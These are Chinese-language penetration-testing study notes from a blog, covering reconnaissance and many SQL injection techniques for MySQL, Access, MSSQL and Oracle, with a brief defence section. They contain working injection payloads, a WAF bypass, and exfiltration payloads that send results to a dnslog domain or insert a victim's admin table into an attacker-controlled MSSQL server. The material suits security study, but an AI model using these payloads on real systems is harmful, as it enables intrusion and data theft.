{"title":"渗透学习总结","uid":"2036d833eadf7ac7f2f1d4187b2dc9e7","slug":"渗透学习总结","date":"2022-10-01T12:53:15.583Z","updated":"2022-10-04T12:50:48.051Z","comments":true,"path":"api/articles/渗透学习总结.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fhbimg.b0.upaiyun.com%2Ffbb3bbcc5e40a92f7b049df2523c5908589325d818880-EkMzKv_fw658&refer=http%3A%2F%2Fhbimg.b0.upaiyun.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1667223164&t=27fe4918cad50d59ba3eab77c87df533","content":"<h1 id=\"一、信息收集\"><a href=\"#一、信息收集\" class=\"headerlink\" title=\"一、信息收集\"></a>一、信息收集</h1><h2 id=\"信息收集收集的是什么：\"><a href=\"#信息收集收集的是什么：\" class=\"headerlink\" title=\"信息收集收集的是什么：\"></a>信息收集收集的是什么：</h2><p>whois信息；子域名；端口探测；目录扫描；指纹识别；旁站查询；C段查询；内容敏感信息泄露</p>\n<h2 id=\"使用的工具：\"><a href=\"#使用的工具：\" class=\"headerlink\" title=\"使用的工具：\"></a>使用的工具：</h2><p>谷歌镜像站：使用谷歌语法进行搜索</p>\n<p>网络空间搜索引擎：FOFA、钟馗之眼、撒旦。直接搜索网络中的主机或其他网络设备，显示主机的IP、端口、中间件、摄像头、工控设备banner等其它网络设备信息。其他网络设备：路由器、智能电视、联网设备。</p>\n<p>子域名：子域名挖掘机。</p>\n<p>端口探测：nmap。一些危险端口：445(<strong>TCP共享服务</strong>   SMB服务)、3306(mysql默认端口)、22(ssh登录端口)、1433(SQL Server默认端口)、6379(redis服务器的端口)</p>\n<p>目录扫描：御剑。有些网站可能某个目录下是一个新的网站，比如用phpstudy搭建的网站</p>\n<p>指纹识别：云悉。CMS可能存在通杀漏洞</p>\n<p>旁站查询：旁站指的是同一个ip上有多个网站，如果成功拿下旁站，有可能和主站在同一台机器。</p>\n<p>C段查询：有些学校或大公司，会持有整个IP段，这个IP段中所有的ip都是那个公司的资产。</p>\n<p>内容敏感信息泄露：使用谷歌语法，找到某些敏感内容，比如包含身份证号的表格、包含服务器账号密码的文件、某些敏感文件、备份数据库。</p>\n<p>有些使用了CDN（内容分发网络）的网站，直接看到的ip很可能不是真实的，需要绕过CDN。</p>\n<h3 id=\"绕过CDN：\"><a href=\"#绕过CDN：\" class=\"headerlink\" title=\"绕过CDN：\"></a>绕过CDN：</h3><p>内部邮箱源：一般邮件系统都在系统内部，没经过CDN，通过注册或者RSS订阅收到的邮件查找（必须是目标自己的邮件服务器）。</p>\n<p>子域名：一般网站主站访问量过大需要挂CDN，而子站就没有。</p>\n<p>国外访问：一般国内cdn只针对国内用户，国外不好说。</p>\n<p>查询域名的解析记录：<a href=\"https://www.netcraft.com/\">https://www.netcraft.com</a>   也许目标很久以前没用过CDN，而在网络中还保存着。</p>\n<h3 id=\"端口状态：\"><a href=\"#端口状态：\" class=\"headerlink\" title=\"端口状态：\"></a>端口状态：</h3><p>open：开放的</p>\n<p>close：关闭的</p>\n<p>Filtered：被过滤的。意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap 无法得知它是 open（开放的） 还是 closed（关闭的）。 </p>\n<p>unfiltered：未被过滤的。未被过滤状态意味着端口可访问但是nmap无法确定它是开放的还是关闭。</p>\n<p>open|filtered：开放或被过滤的</p>\n<p>closed|filtered：关闭或被过滤的</p>\n<p><strong>信息收集的关键就是域名和IP</strong></p>\n<h1 id=\"二、SQL注入\"><a href=\"#二、SQL注入\" class=\"headerlink\" title=\"二、SQL注入\"></a>二、SQL注入</h1><p><strong>注入的本质：把用户输入的数据当做代码执行。</strong></p>\n<h2 id=\"1、按注入点数据类型分类：\"><a href=\"#1、按注入点数据类型分类：\" class=\"headerlink\" title=\"1、按注入点数据类型分类：\"></a>1、按注入点数据类型分类：</h2><h3 id=\"1-数字型注入\"><a href=\"#1-数字型注入\" class=\"headerlink\" title=\"1.数字型注入\"></a>1.数字型注入</h3><p>没有闭合，测试时使用and 1=1和and 1=2或者or 1=1和or 1=2，对比响应结果是否一致，一致则可能存在数字型注入。</p>\n<h3 id=\"2-字符型注入\"><a href=\"#2-字符型注入\" class=\"headerlink\" title=\"2.字符型注入\"></a>2.字符型注入</h3><p>测试时需要考虑闭合，单引号、双引号和括号</p>\n<h3 id=\"3-搜索型注入\"><a href=\"#3-搜索型注入\" class=\"headerlink\" title=\"3.搜索型注入\"></a>3.搜索型注入</h3><p>测试时需要用“%”来进行闭合。</p>\n<h2 id=\"2、按照数据提交方式分类\"><a href=\"#2、按照数据提交方式分类\" class=\"headerlink\" title=\"2、按照数据提交方式分类\"></a>2、按照数据提交方式分类</h2><h3 id=\"1-get注入\"><a href=\"#1-get注入\" class=\"headerlink\" title=\"1.get注入\"></a>1.get注入</h3><p>数据以get方式进行提交。注入点一般在get提交的url后，可以通过bp抓包进行查找</p>\n<h3 id=\"2-post注入\"><a href=\"#2-post注入\" class=\"headerlink\" title=\"2.post注入\"></a>2.post注入</h3><p>数据以post方式进行提交。注入点一般在表单的填写出，可以通过bp抓包进行查找。</p>\n<h3 id=\"3-head头注入（http头注入）\"><a href=\"#3-head头注入（http头注入）\" class=\"headerlink\" title=\"3.head头注入（http头注入）\"></a>3.head头注入（http头注入）</h3><p>user-agent:判定用户使用的操作系统，以及使用的浏览器的版本</p>\n<p>cookie:判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡</p>\n<p><strong>x-forwarded-for:是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong></p>\n<p>client-ip: 数据库保存客户端IP的参数</p>\n<p>rerferer:浏览器向web端表明自己从哪个连接而来</p>\n<p>host:客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">head头注入需要：盲注和报错注入结合使用。\nmysql数据库致命性报错函数：updatexml()：更新xml文档的函数\n语法：updatexml(目标xml内容，xml文档路径，更新的内容)\n还需要知道concat()：拼接字符串的函数</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">例：or updatexml(123,concat(&#39;~&#39;,(select database())),123) -- qwe\n~可以使用0x7e，因为mysql支持16进制，而且单引号通常会被过滤\nor updatexml(123,concat(0x7e,(select database())),123) -- qwe\n\n在这里使用or不行就换and\n报错注入需要一个字段一个字段的拿</code></pre>\n\n<h2 id=\"3、按照执行效果分类\"><a href=\"#3、按照执行效果分类\" class=\"headerlink\" title=\"3、按照执行效果分类\"></a>3、按照执行效果分类</h2><h3 id=\"1-盲注\"><a href=\"#1-盲注\" class=\"headerlink\" title=\"1.盲注\"></a>1.盲注</h3><p>特点：盲注在于无法构造出回显时使用，适合绝大部分注入点，比较费时费力，高频率访问容易被ban。</p>\n<p>分类：布尔盲注，时间盲注，dnslog盲注（MySQL）</p>\n<h4 id=\"①布尔盲注\"><a href=\"#①布尔盲注\" class=\"headerlink\" title=\"①布尔盲注\"></a>①布尔盲注</h4><p>特点：<strong>以页面回显的内容的不同作为判定依据</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">id&#x3D;1 and 1&#x3D;1\nid&#x3D;1 and 1&#x3D;2\nand length(database())&gt;12 -- qwe\t\t\nand length(database())&lt;13 -- qwe\t\t#页面正常，则数据库名有12个字符\nand substr(database(),1,1)&#x3D;a -- qwe\t\t#页面正常，则数据库名的第一个字符为“a”\t\tsubstr()：截取字符串\nand ascii(substr(databse(),1,1)) -- qwe\t#用字符的ascii码来缩小查找范围\t\t\tascii()：返回字符串的ascii码，将字符变为数字</code></pre>\n\n<h4 id=\"②时间盲注\"><a href=\"#②时间盲注\" class=\"headerlink\" title=\"②时间盲注\"></a>②时间盲注</h4><p>特点：<strong>以回显的时长来作为判断依据</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">id&#x3D;1 and sleep(2) -- qwe\nid&#x3D;1 and if(ascii(substr(database(),1,1))&#x3D;10,sleep(5),1) -- qwe\t\t#页面正常，则数据库名的第一个字符就是ascii码为10所代表的那个字符</code></pre>\n\n<h4 id=\"③dnslog盲注\"><a href=\"#③dnslog盲注\" class=\"headerlink\" title=\"③dnslog盲注\"></a>③dnslog盲注</h4><p>特点：<strong>必须是windows系统，必须是root权限</strong></p>\n<p><strong>需要使用到load_file()：读取文件的函数，仅限mysql函数</strong></p>\n<p>dnslog平台：dnslog.cn</p>\n<p>但是load_file()函数默认是不支持的，需要修改mysql文件夹下的my.ini文件，在文件最后一行加上“**secure_file_priv=**”，即secure_file_priv为空。</p>\n<p>UNC路径：windows的SMB服务，linux默认没有SMB服务的，所以要求windows系统，但是linux也可以安装SMB服务。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">id&#x3D;1 and 1&#x3D;(select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.这里是从dnslog平台获得的域名&#39;)))</code></pre>\n\n\n\n<p><strong>apache解析特性</strong>，你对1.txt/jpg/png/gif/zip?id=1这些文件传参没什么用，WAF也会认为这个东西是安全的</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:127.0.0.1:8080&#x2F;1.php&#x2F;123.txt\t\t#它会检测123.txt文件存不存在，若不存在则访问他的上级，即1.php，是一个绕过waf的方法。\n\nid&#x3D;1 and 1&#x3D;(select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.这里是从dnslog平台获得的域名&#x2F;&#x2F;abc&#39;)))\t#abc是要查找的文件夹，写什么都行，主要为了绕过waf，sql查询的结果会出现在dnslog平台</code></pre>\n\n\n\n<p>写文件函数</p>\n<p>into outfile    ‘路径’</p>\n<p>into dumpfile ‘路径’</p>\n<h3 id=\"2、报错注入\"><a href=\"#2、报错注入\" class=\"headerlink\" title=\"2、报错注入\"></a>2、报错注入</h3><p>特点：经过精心构造的函数，让函数处理user()等不合规定的数据，引发mysql报错。最常用的是updatexml()，<strong>报错函数有很多</strong></p>\n<p>优点：报错注入优点是注入位置广泛，几乎任何和数据库有关的操作经过sql拼接都可以产生报错注入，有回显位，获取数据方便。</p>\n<p>缺点：缺点是必须开启错误提示，mysqli_error()</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1.floor\nid&#x3D;1 and \n(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group\nby x)a);\n\n2.extractvalue()\n\nid&#x3D;1 and\n(extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n3.updatexml()\n\nid&#x3D;1 and (updatexml(1,concat(0x7e,(select\nuser()),0x7e),1));\n\n4.geometrycollection()\n\nid&#x3D;1 and geometrycollection((select *\nfrom(select * from(select user())a)b));\n\n5.multipoint()\n\nid&#x3D;1 and multipoint((select * from(select\n* from(select user())a)b));\n\n6.polygon()\n\nid&#x3D;1 and polygon((select * from(select *\nfrom(select user())a)b));\n\n7.multipolygon()\n\nid&#x3D;1 and multipolygon((select *\nfrom(select * from(select user())a)b));\n\n8.linestring()\n\nid&#x3D;1 and linestring((select * from(select\n* from(select user())a)b));\n\n9.multilinestring()\n\nid&#x3D;1 and multilinestring((select *\nfrom(select * from(select user())a)b));\n\n10.exp()\n\nid&#x3D;1 and exp(~(select * from(select\nuser())a));\n</code></pre>\n\n<h3 id=\"3、显错注入——联合查询\"><a href=\"#3、显错注入——联合查询\" class=\"headerlink\" title=\"3、显错注入——联合查询\"></a>3、显错注入——联合查询</h3><p>特点：联合注入使用了union select联合查询，常用来拼接在where后面，并且通过报错的方式显示显位</p>\n<p>优势：联合注入通过显位的方式可以快速的爆出数据</p>\n<p>缺点：缺点是只能用在select最后处，后面如果还有sql语句就必须注释掉。并且必须用到union和select两个关键字，并且这两个关键字也很容易被拦截</p>\n<p>联合查询的核心需要满足：两个查询语句的结果集字段数必须相同。</p>\n<p>关键函数：union select、group_concat</p>\n<p>mysql数据库中高于5.0版本的都有一个系统自带库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">information_schema</code></pre>\n\n<p>库里面有两张表：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">information_schema.tables\t\t#存放表名和库的对应\ninformation_schema.columns\t\t#存放字段名和表名的对应</code></pre>\n\n<p>sql语句</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select * from news where id&#x3D;1;\n#判断字段数，即列数\nselect * from news where id&#x3D;1 order by 1\t\t\t#通过替换1和页面显示正确与否来判断有几个字段\n#判断输出点\nselect * from news where id&#x3D;-1 union select 4789,5789\t\t\t#例如判断出有2个字段，这样传参之后页面显示4789或5789则是可以显示的点\n#通过输出点输出数据库名\nselect * from news where id&#x3D;-1 union select database(),2,3,4\n#通过输出点来输出表名\nselect * from news where id&#x3D;-1 union select 4789,table_name from information_schema.tables where table_schema&#x3D;database()\t#通过可以回显的这个点来判断表名\n#输出字段名\nselect 8 from news where id&#x3D;-1 union select 4789,column_name from information_shcema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39;\t\t\t#假如表名为admin\n#通过limit 1,1&#x2F;limit 2,1 查看有哪些字段名\nselect 8 from news where id&#x3D;-1 union select 4789,column_name from information_shcema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39; limit 1,1\t\t#假如判断出一个字段名为uname\nselect 8 from news where id&#x3D;-1 union select 4789,uname from admin</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">如果遇到字符型传参，则需要进行闭合和注释\n闭合：一般会出现小括号，单引号，双引号这些，需要逐个进行尝试才能知道\n注释可以用：%23代表的就是#，但是#只适用于mysql。也可以用-- qwe，它可以注入部分的数据库语句</code></pre>\n\n<h3 id=\"4、宽字节注入\"><a href=\"#4、宽字节注入\" class=\"headerlink\" title=\"4、宽字节注入\"></a>4、宽字节注入</h3><p>特点：</p>\n<ul>\n<li>字符注入的时候我们需要逃逸闭合。php提供了魔术引号开关magic_quotes_gpc和addslashed()，iconv()这些函数来进行防御，魔术引号会将我们的闭合，例如单引号和双引号这些前面加上一个反斜杠，进行转义，使闭合失效。</li>\n<li>如果数据库是GBK编码而非默认的UTF-8编码，我们就可以利用传参一个字符和进行转义的反斜杠组合成一个汉字，从而解决魔术引号的反闭合。</li>\n<li>宽字节sql注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入</li>\n</ul>\n<p>url编码的核心是16进制</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">get传参的注入：\n\\所对应的url编码为%5c对应的十六进制就是5c\n&#39;所对应的url编码为%27\n跟%5c能组成汉字就能进行宽字节注入，例如：\n“%d5%5c”所代表的就是汉字“诚”，即%d5%5c&#x3D;0xd50x5c&#x3D;诚\n所有能和%5c组成汉字的字符都可以使用，例如%aa</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Select * from user where id&#x3D;&#39;1&#39;;\t\t#例如这是一个正常的url所对应的数据库的语句\nSelect * from user where id&#x3D;&#39;1%d5\\&#39;&#39; and 1&#x3D;1 -- qwe\t\t#%d5和反斜杠组成了汉字“诚”，所以后面的单引号就行进行闭合</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">对于post传参的宽字节注入有两种方法：\n1、直接输入汉字来进行绕过就可以了\n例：诚&#39; or 1&#x3D;1 -- qwe\n2、输入一个a，然后用bp抓包，调到hex模式，找到所输入的那个a对应的16进制的代码为“61”，然后将61改为d5即可,然后放包</code></pre>\n\n<h3 id=\"5、Cookie注入——Access注入\"><a href=\"#5、Cookie注入——Access注入\" class=\"headerlink\" title=\"5、Cookie注入——Access注入\"></a>5、Cookie注入——Access注入</h3><p>Cookie注入不仅仅存在于Access数据库中，这里以Access数据库为例。</p>\n<p><strong>Asp站遇到Cookie注入的几率大一些</strong></p>\n<p>在动态语言中存在超全局变量可以获取多种传参方式（基本上），很多时候开发在开发的时候为了考虑到多种接收参数，在接收参数的时候都用多种解释传参的方法。</p>\n<p>例：php中的$_REQUEST[]可以获取POST|GET|COOKIE传参</p>\n<p><strong>注意：php5.4以上版本不接受Cookie传参</strong></p>\n<p>使用场景：POST，GET传参时产生了拦截的时候可以使用Cookie传参。</p>\n<p>遇到拦截时，我们要思考应对的策略，如：</p>\n<p>①找个不拦截的东西（GET、POST、Cookie、Head里面分别进行传参尝试）；</p>\n<p>②寻找规则，知道它是怎么拦截的，然后进行绕过</p>\n<p>Cookie注入只是传参点的不同，属于是head头注入的一种。</p>\n<p>设置Cookie的方法有三种：</p>\n<p>1.用bp抓包进行修改</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie:.........;id&#x3D;171</code></pre>\n\n<p>2.浏览器插件Edit Cookie</p>\n<p>Cookie需要URL编码和SQL注入没有区别。</p>\n<p>Access数据库必须带表名，而且Access数据库没有系统自带库，所有就要强行猜解来猜测表名。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Cookie:.........;id&#x3D;171 and exists(select * from 表名)\t\t#若显示正常则存在该表，可以用burp来进行爆破表名。</code></pre>\n\n<p>3.用js设置Cookie</p>\n<p>F12——&gt;Console</p>\n<p>记得将插件Edit Cookie关掉，会有影响。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">document.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;171 order by 10&quot;)\t\t#记得语句中有了171就要把url栏里面的?id&#x3D;171删掉。escape是一个编码函数，会进行一次url编码</code></pre>\n\n<p>使用sqlmap跑cookie注入:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">py sqlmap.py -u url --cookie &quot;id&#x3D;171&quot; --level 2\t\t#url中的?id&#x3D;171记得删掉</code></pre>\n\n<h3 id=\"7、偏移注入——Access注入\"><a href=\"#7、偏移注入——Access注入\" class=\"headerlink\" title=\"7、偏移注入——Access注入\"></a>7、偏移注入——Access注入</h3><p>偏移注入使用场景：</p>\n<p><strong>在知道表名，不知道字段名的情况下查询数据，就需要用到偏移注入</strong></p>\n<p>首先，我们要知道：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">*：在数据库中代表一切\n库.表：表示选中这个库里面的这个表\nadmin.*：表示admin表中的所有字段</code></pre>\n\n<p>之前的sql注入流程都相似，一直到猜不到字段名的时候才开始偏移注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#例如sql查到的表为admin表\n#但是当前网页所用到的表很可能不是admin表，例如是news表，那么就要判断news表中有多少个字段\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 order by 10&quot;)\t\t\t\t#假设10显示正常，11显示异常，则news表中有10个字段\n#然后判断显错点\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;)\t\t#假如显错点是3,5,7\n#注意显错点有的时候在页面中没有显示出来，可以使用F12查看源代码，源代码中有可能出现显错点\n#接下来就要判断admin表中有多少个字段\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select admin.*,6,7,8,9,10 from admin&quot;)\t\t#通过不断删除多于admin字段的个数，显示正常后，假如admin有5个字段，假设这5个字段分别为a,b,c,d,e\n#则所代表的意思如下\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select 1,admin.*,7,8,9,10 from admin&quot;)\t\t等价于\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select 1,a,b,c,d,e,7,8,9,10 from admin&quot;)\n之后通过移动admin.*的位置，使admin表中更多的字段出现在显错点上，即可获取到部分字段名。</code></pre>\n\n<p>偏移注入用sqlmap是跑不出来的</p>\n<p>Access数据库不支持limit，limit是mysql独有的，但是Access支持top关键字，MSSQL数据库也支持top：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">top 1 &#x3D;&gt;只取一条数据\ntop 2 &#x3D;&gt;只取两条数据\ndesc\t数据倒序排列，结合top 1\n可以取出之前排序最后的那条数据\n1,2,3,4,5,6,7,8,9,19\n10,9,8,7,6,5,4,3,2,1\n当使用倒序时，会根据那个小排前面，则输出小的\ntop 3 &#x3D;&gt;\t10,9,8  &#x3D;&gt;\t会显示8的数据\ntop 4 &#x3D;&gt;\t10,9,8,7&#x3D;&gt;\t会显示7的数据</code></pre>\n\n<h3 id=\"8、反弹注入——MSSQL注入\"><a href=\"#8、反弹注入——MSSQL注入\" class=\"headerlink\" title=\"8、反弹注入——MSSQL注入\"></a>8、反弹注入——MSSQL注入</h3><p>使用场景：</p>\n<p>明明是SQL的注入点却无法进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，未解决以上这些疑难杂症，比较好的结局方法就是使用反弹注入技术，而反弹注入技术则需要依靠<strong>opendatasource函数</strong>支持</p>\n<p>反弹注入的核心：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">A数据库&#x3D;&gt;攻击者\nB数据库&#x3D;&gt;被攻击者\n让B数据库将查询获得的数据插入到A数据库中，即你建立的数据库。</code></pre>\n\n<p>因此，我们需要一个在公网上的数据库。可以使用虚拟空间：</p>\n<ul>\n<li>香港云：<a href=\"http://www.webweb.com/\">http://www.webweb.com</a>        申请一个30试用的</li>\n</ul>\n<p>注册需要使用邮箱可以使用临时邮箱：24mail.chacuo.net</p>\n<p>需要手机号的话可以使用匿名电话号：yunduanxin.net</p>\n<ul>\n<li>国外平台：<a href=\"https://my.gearhost.com/CloudSite\">https://my.gearhost.com/CloudSite</a>        这个平台永远都不会删除你的数据。</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">通过虚拟空间我们需要获得：\n数据库地址\t数据库名\t用户名\t密码\n然后使用navicat尝试连接，看能否使用</code></pre>\n\n<p>反弹注入我们需要用到<strong>MSSQL显错注入</strong>。MSSSQL注入和MySQL注入有区别：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#其一，联合查询最好都加上all，例：\nunion all select 1,2,3\n#其二，MSSQL对数据类型要求比较严格，所以填充位最好写null，然后将null换成数字或字母，一个一个试，通过显示正常来判断输出点的类型，例：\nunion all select null,null,null\n#其三，MSSQL的系统自带表为：\nsysobjects\t\tsyscolumns\t\t\t\n#information_schema也同样存在于MSSQL数据库中\n#其四，用户创建的表格在系统表中的类型都是U，可以通过xtype&#x3D;&#39;U&#39;来进行查找：\nselect * from sysobjects where xtype&#x3D;&#39;U&#39;\t\t#这句就可以看到用户所建立的表，其中每张表都对应的有一个独特的id\n#其五，输出点不可能输出一行数据，而是输出一个字段的数据\nselect name from sysobjects where xtype&#x3D;&#39;U&#39;\n\nunion all select id,name,5 from sysobjects where xtype&#x3D;&#39;U&#39;\t#通过这句可以查到所有用户创建的表还有所对应的id\nunion all select id,name,5 from syscolumns where id&#x3D;282822 -- qwe\t\t#假如查到字段名id,passwd,token,username\nunion all select null,passwd,token from admin\t\t-- qwe</code></pre>\n\n<p>dbo是MSSQL数据库有关权限的，代表当前用户的权限</p>\n<p>opendatasource()：使用这个函数可以将当前数据库查询的结果发送到另一个数据库服务器中。</p>\n<p>语法：</p>\n<p>opendatasource(provider_name,init_string)</p>\n<p>provider_name：注册为用于访问数据源的OLEDB提供数据库的PROGID的名称，一般是固定的，MSSQL的名称为 <strong>SQLOLEDB</strong></p>\n<p>init_string:连接字符串，server=连接地址、端口、uid用户名、pwd=密码、database=数据库名</p>\n<p>要进行反弹注入的两个表的字段数要相同，而且每个字段的类型也要一一对应。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#假设数据库名为test,目标网站的表名为admin，那么就创建一个相同字段数的表temp\n&#39;; insert into opendatasource(&#39;sqloledb&#39;,&#39;server&#x3D;连接地址;1433;uid&#x3D;用户名;pwd&#x3D;密码;database&#x3D;test&#39;).test.dbo.temp select * from admin -- qwe</code></pre>\n\n<p><strong>堆叠注入：</strong></p>\n<p>分号结尾原有的，然后创建新的语句（所有数据库都可能有），但是mysql少见</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">例：select * from admin; select database()\t\t#数据库语句分号即结尾，但是堆叠注入的分号后的语句依旧会执行。</code></pre>\n\n<p>MSSQL的<strong>延时函数</strong>与MySQL不同：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">seelct * from syscolumns where id&#x3D;1 waitfor delay &#39;0:0:3&#39;\t-- qwe</code></pre>\n\n<h3 id=\"9、堆叠注入\"><a href=\"#9、堆叠注入\" class=\"headerlink\" title=\"9、堆叠注入\"></a>9、堆叠注入</h3><p>特点：</p>\n<ul>\n<li>堆叠注入在MySQL数据库中不常见，常见于MSSQL，MSSQL数据库是默认堆叠注入的；</li>\n<li>堆叠注入必须要用到mysqli_multi_query()函数，可以使用分号分隔来执行多条语句，相当与可直连数据库；</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">id&#x3D;1;select * from admin;</code></pre>\n\n<h3 id=\"10、Oracle注入——报错注入\"><a href=\"#10、Oracle注入——报错注入\" class=\"headerlink\" title=\"10、Oracle注入——报错注入\"></a>10、Oracle注入——报错注入</h3><p>特点：</p>\n<ul>\n<li>Oracle弱化了库的概念，强化了用户的概念，用户就是库；</li>\n<li>dual——&gt;虚表</li>\n</ul>\n<p>判断注入;</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">url?id&#x3D;1 and (select count (*) from user_tables)&gt;0 -- qwe\nurl?id&#x3D;1 and (select count (*) from dual)&gt;0 -- qwe</code></pre>\n\n<p>utl_inaddr.get_host_name()进行报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;utl_inaddr.get_host_name((select user from dual))-- qwe</code></pre>\n\n<p>ctxsys.drithsx.sn()进行报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum&#x3D;1)) -- qwe\t\t#这里的“1&#x3D;”不能省略，省略了用不了</code></pre>\n\n<p>XMLType()进行报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null -- qwe</code></pre>\n\n<p>dbms_xdb_version.checkin()进行报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null -- qwe</code></pre>\n\n<p>bms_xdb_version.makeversioned()进报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -- qwe</code></pre>\n\n<p>dbms_xdb_version.uncheckout()进行报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null -- qwe</code></pre>\n\n<p>dbms_utility.sqlid_to_sqlhash()进行报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null -- qwe</code></pre>\n\n<p> ordsys.ord_dicom.getmappingxpath()进行报错注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;ordsys.ord_dicom.getmappingxpath((select user from dual),user,user) -- qwe</code></pre>\n\n<p>decode进行报错注入</p>\n<p>这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;(select decode(substr(user,1,1),&#39;S&#39;,(1&#x2F;0),0) from dual) --</code></pre>\n\n<p><strong>Oracle的系统自带库：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select * from all_tables \t\t#列出所有表\nselect * from user_tables\t\t#查询出当前用户的表\nselect * from all_tab_columns&#96;\t#查询出所有字段\nselect * from user_tab_columns\t#查询出当前用户的字段\nselct * from v$version\t\t\t#查版本</code></pre>\n\n<p><strong>Oracle限制返回条数（与limit功能一样）：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">rownum &#x3D; 1\t\t\t#限制查询返回的总行数为一条，是Oracle数据库特有的\nselect * from admin where rownum&#x3D;1\t\t#一条数据\nselect * from admin where rownum&lt;3\t\t#两条数据</code></pre>\n\n<p><strong>Oracle显错注入：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">adn 1&#x3D;1\nand 1&#x3D;2\norder by 1\n...\n...\nunion all select null,null,null,null from dual\t\t\t#真实渗透测试过程中基本不可能知道null的数据类型</code></pre>\n\n<h2 id=\"4、防范sql注入\"><a href=\"#4、防范sql注入\" class=\"headerlink\" title=\"4、防范sql注入\"></a>4、防范sql注入</h2><p>注入攻击产生的关键在于系统对用户输入处理不当，未做到数据与代码分离，从而导致输入的数据被当做代码执行。</p>\n<p>在系统开发时，只要遵循<strong>数据与代码分离的原则</strong>，并且完全做到这点，注入漏洞是完全可以避免的。</p>\n<h3 id=\"1-使用预编译语句集\"><a href=\"#1-使用预编译语句集\" class=\"headerlink\" title=\"1.使用预编译语句集\"></a>1.使用预编译语句集</h3><p>采用预编译语句集，它内置了处理sql注入的能力，只要使用它的setXXX方法传参即可。</p>\n<p>原理：</p>\n<ul>\n<li>sql注入只对sql语句的准备（编译）过程有破坏作用</li>\n<li>而PreparedStatement已经准备好了，执行阶段只是把输入串作为数据处理</li>\n<li>而不再对sql语句进行解析，准备，因此也就避免了sql注入</li>\n</ul>\n<h3 id=\"2-使用正则表达式过滤传入的参数\"><a href=\"#2-使用正则表达式过滤传入的参数\" class=\"headerlink\" title=\"2.使用正则表达式过滤传入的参数\"></a>2.使用正则表达式过滤传入的参数</h3><h3 id=\"3-字符串过滤\"><a 